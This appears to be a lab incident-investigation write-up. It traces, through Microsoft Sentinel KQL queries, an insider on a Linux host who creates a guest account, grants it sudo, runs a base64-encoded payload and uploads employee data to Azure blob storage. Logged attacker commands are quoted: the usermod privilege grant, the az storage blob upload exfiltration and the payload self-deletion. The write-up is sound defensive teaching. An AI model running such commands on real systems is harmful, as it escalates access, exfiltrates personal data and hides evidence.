# Investigation Walkthrough 

## Alert Detection
An alert triggered from the following Microsoft Sentinel rule identified suspicious privilege modification activity

<p align="center">
  <img width="1500" height="856" alt="Pasted image 20251209180947" src="https://github.com/user-attachments/assets/f980ec9f-dd1b-42e7-b77e-400f6a3e5070" />
</p>

Alert Rule:
```kql
let timePeriodThreshold = ago(3d);
let sensitiveGroups = dynamic(["sudo"]);
DeviceProcessEvents
| where Timestamp > timePeriodThreshold
| where InitiatingProcessCommandLine contains "usermod -aG"
| where InitiatingProcessCommandLine has_any (sensitiveGroups)
```

Based on the logs returned, it is confirmed that the following command was executed to add a new user to the `sudo` usergroup:
```bash 
sudo usermod -aG sudo guest  
```
- Timestamp: 2025-12-07T01:13:09.446959Z
- Account:  `labuser123`
- Target account: `guest`

This alert was marked as a **true positive**, as the user `labuser123` granted administrative privileges to a guest account. 

> A "guest" account should never exist on the corporate workstation let alone have sudo privileges.

Workstation `linux-lab6700` was isolated **immediately** for further investigation.
## Guest Account Creation 

Using info gathered from the alert logs, we can determine when the `guest` account was created. 

```kql
DeviceProcessEvents
| where DeviceName contains "linux-lab6700"
| where InitiatingProcessCommandLine contains "guest"
| order by TimeGenerated asc
| project TimeGenerated, AccountDomain, AccountName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessSHA256
```

The following command was found: 
```bash 
sudo useradd guest
```
- Timestamp: 2025-12-06T23:51:37.764906Z
- AccountName: labuser123

<p align="center">
  <img width="934" height="310" alt="Screenshot 2025-12-08 at 7 58 01 PM" src="https://github.com/user-attachments/assets/2612d97f-e1be-4326-b2ad-c722552c66d7" />
</p>

`labuser123` created an unauthorized `guest` account around 1 hour before granting it sudo privileges. 
## Pre-unuathorized account creation activity

Reviewing the logs prior to the timestamp of `labuser123` creating the `guest` account shows normal system activity (package updates, upgrades, etc). 

```kql 
DeviceProcessEvents
| where DeviceName contains "linux-lab6700"
| where TimeGenerated < todatetime('2025-12-06T23:51:37.764906Z')
| order by TimeGenerated asc
| project TimeGenerated, AccountDomain, AccountName, ProcessCommandLine, FolderPath, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessSHA256
```

## Post-unauthorized account creation acitvity

Malicious activity picks up after the `guest` account was created.
```kql
DeviceProcessEvents
| where DeviceName contains "linux-lab6700"
| where TimeGenerated > todatetime('2025-12-06T23:51:37.764906Z')
| order by TimeGenerated asc
| project TimeGenerated, AccountDomain, AccountName, ProcessCommandLine, FolderPath, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessSHA256
```

### Hidden Directory and Files
Just a few minutes after the `guest` account was created, `labuser123` is seen creating a a hidden directory and hidden file: 

```bash
mkdir /.Desktop
```
- Timestamp: 2025-12-06T23:54:31.326604Z
- AccountName: labuser123
- SHA256: `bd2f081ac37d653181332bd27f35a6041dbf215a7957f65838a9cbec9e64928b`

```bash
touch .notes.txt
vim .notes.txt
```
- Timestamp: 2025-12-06T23:55:43.851437Z
- AccountName: labuser123
- SHA256: `dff9809310a5507c6e85ce2c6a6abe58e3e8e8cd46bd9863792bc566751b6f54`

<p align="center">
  <img width="1088" height="538" alt="Screenshot 2025-12-08 at 8 21 37 PM" src="https://github.com/user-attachments/assets/95e95d58-cee2-44c7-ac0d-369990909c51" />
</p>

On Linux, files and directories beginning with `.` are treated as hidden. 

Users already have a `~/Desktop` directory, so creating a new `/.Desktop` hidden directory is seen as suspicious. 

It is not common for users to create hidden files, let alone a hidden note text document. This strongly indicates an IOC used for future malicious purposes.


## File Creation Events

Instead of looking at DeviceProcessEvents, we can switch our search to DeviceFileEvents to see other files created or deleted by the user.

```kql 
DeviceFileEvents
| where DeviceName contains "linux-lab6700"
| where InitiatingProcessAccountName == "labuser123"
| where ActionType == "FileCreated"
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, InitiatingProcessAccountName, FileName, FolderPath, FileSize, InitiatingProcessCommandLine, SHA256
```
### BASH Script Created and Edited

`labuser123` is recorded to have created a Bash script within the hidden directory:

```bash 
touch script.sh
```

- Timestamp: 2025-12-07T01:05:41.527928Z
- AccountName: `labuser123`
- FileName: `script.sh`
- FolderPath: `/home/labuser123/.Desktop/script.sh`
- FileSize: 0
- SHA256: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`

The script is then edited most likely with a malicious payload as the FileSize increased: 
```bash
vim script.sh
```

- Timestamp: 2025-12-07T01:12:10.238318Z
- AccountName: `labuser123`
- FileName: `script.sh`
- FolderPath: `/home/labuser123/.Desktop/script.sh`
- FileSize: 1344
- SHA256: `a7ec4ac67cbecc5cdf059e15e84cd0433e6854049bc3019f8172a8900f8902bf`

<p align="center">
  <img width="1056" height="334" alt="Screenshot 2025-12-09 at 8 04 54 PM" src="https://github.com/user-attachments/assets/dc8127b7-5a29-4510-9f9a-0a6e6d3e0216" />
</p>

### BASH Script Executable

`labuser123` makes this script executable:
```bash
chmod +x script.sh
```
- Timestamp: 2025-12-07T01:12:57.957357Z
- AccountName: labuser123
- FileName: `script.sh`

### BASH Script Ran
Then a few seconds later, the script is ran: 
```bash
/bin/bash ./script.sh
```

- Timestamp: 2025-12-07T01:13:09.423162Z
- AccountName: labuser123
- FileName: `script.sh`

And immediately after, we see:
```bash
base64 -d
```

- Timestamp: 2025-12-07T01:13:09.426069Z
- AccountName: labuser123
- FileName: script.sh
- InitiatingProcessCommandLine: `/bin/bash ./script.sh`

A few miliseconds after the script is ran, base64 decoder was used which indicates part of this script's payload is encoded in base64.

<p align="center">
  <img width="1356" height="544" alt="Screenshot_4" src="https://github.com/user-attachments/assets/88e917f7-1352-4771-bbad-fb6c34f25687" />
</p>

### PAYLOAD CREATED AND MADE EXECUTABLE
```bash
chmod +x /tmp/.payload.sh
```

- Timestamp: 2025-12-07T01:13:09.428305Z
- AccountName: labuser123
- FileName: `.payload.sh`
- FolderPath: `/tmp`
- InitiatngProcessCommandLine: `/bin/bash ./script.sh`

```bash
bash /tmp/.payload.sh
```
- Timestamp: 2025-12-07T01:13:09.432859Z
- AccountName: labuser123
- FolderPath: `/usr/bin/bash`
- InitiatingProcessCommandLine: `bash /tmp/.payload.sh`

Based on the timestamp, these lines of code are executed instantly. This indicates part of `script.sh` payload is creating another script `.payload.sh` in the `/tmp` folder

<p align="center">
  <img width="1306" height="459" alt="Screenshot_5" src="https://github.com/user-attachments/assets/c6c6486a-8bb3-4ba3-8286-dc7422cccc26" />
</p>

### GUEST SUDO PRIVILEGES

We finally see the command that triggered Microsoft Sentinel's alert for unauthorized privileges: 
```bash
sudo usermod -aG sudo guest
```
- Timestamp: 2025-12-07T01:13:09.433132Z
- AccountName: labuser123
- InitiatingProcessCommandLine: `bash /tmp/.payload.sh`

Based on the Timestamp and InitiatingProcessCommandLine, this confirms that the privilege escalation granted to `guest` was part of the malicious payload.

<p align="center">
  <img width="1327" height="624" alt="Screenshot_6" src="https://github.com/user-attachments/assets/9cf7294c-e0b6-40e6-8f09-6cc4c9bcbff2" />
</p>

### DATA EXFILTRATION VIA AZURE CLI

Next, we observe data exfiltration using Azure CLI:
```bash
/usr/bin/env bash /usr/bin/az storage blob upload ��--account-name linuxlab6700storage ��--account-key ********** ��--container-name linuxlab6700storage ��--file /home/labuser123/.Desktop/.notes.txt ��--name employee_data
```
- Timestamp: 2025-12-07T01:13:09.483533Z
- AccountName: labuser123
- InitiatingProcessCommandLine: `bash /tmp/.payload.sh`
- File exfiltrating: `��--file /home/labuser123/.Desktop/.notes.txt`
- Output file: `employee_data`

Based on the code, `/.Desktop/.notes.txt` contains the stolen information from our employees and is being sent to Azure Storage Container `linuxlab6700storage` with the output name `employee_data`

This explains how the personal identifiable information (PII) of some employees have made their way online. 

<p align="center">
  <img width="1740" height="882" alt="Screenshot_7" src="https://github.com/user-attachments/assets/9d2de43a-efa4-4e41-b2f4-0488f29dcd6a" />
</p>

### SELF DELETING PAYLOAD

The malicious script attempts to self delete: 
```bash
rm -- /tmp/.payload.sh
```
- Timestamp: 2025-12-07T01:13:12.865684Z
- AccountName: labuser123
- InitiatingProcessCommandLine: `bash /tmp/.payload.sh`

<p align="center">
  <img width="1528" height="427" alt="Screenshot_8" src="https://github.com/user-attachments/assets/059266ad-dbb9-4d49-a929-ff518da8d58d" />
</p>

### Cleanup

A few minutes go by and we can see that `labuser123` tries cleaning up their tracks by manually deleting the leftover files and directory: 

```bash
rm .notes.txt script.sh
```
- Timestmap: 2025-12-07T01:20:12.598566Z
- AccountName: labuser123
- InitiangProcessCommandLine: `-bash`

```bash
rm -rf .Desktop/
```
- Timestamp: 2025-12-07T01:20:34.005399Z
- AccountName: labuser123
- InitiatingProcessCommandLine: `-bash`

<p align="center">
  <img width="1708" height="757" alt="Screenshot_9" src="https://github.com/user-attachments/assets/87abb827-992c-43c9-a7fc-bcc1b9d34848" />
</p>

> Viewing logs after the hidden directory `/.Desktop` was deleted indicates no further malicious activity. 
## Exfiltration Confirmation

To confirm that data was actually exfiltrated through Azure CLI, we can view `DeviceNetworkEvents`

```kql
DeviceNetworkEvents
| where DeviceName contains "linux-lab6700"
| where InitiatingProcessAccountName == "labuser123"
| where TimeGenerated > todatetime('2025-12-06T23:51:37.764906Z')
| order by TimeGenerated asc
| project TimeGenerated, ActionType, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, RemoteIP, RemotePort
```

In which we can observe the following network activity: 
```bash
`/usr/bin/../../opt/az/bin/python3 -Im azure.cli storage blob upload --account-name linuxlab6700storage --account-key ********** --container-name linuxlab6700storage --file /home/labuser123/.Desktop/.notes.txt --name employee_data`
```

- Timestamp: 2025-12-07T01:19:14.849281Z
- ActionType: ConnectionSuccess
- InitiatingProcessAccountName: labuser123
- RemoteIP: `20.209.90.130`
- RemotePort: `443`

This confirms that Azure CLI successfully connected to a remote IP `20.209.90.130` over port `443`, moving the employee data in `/home/labuser123/.Desktop/.notes.txt` to Azure Storage 

<p align="center">
  <img width="1882" height="404" alt="Screenshot_10" src="https://github.com/user-attachments/assets/2a5bbaa4-e01b-4ddf-a5c6-1d92390db746" />
</p>
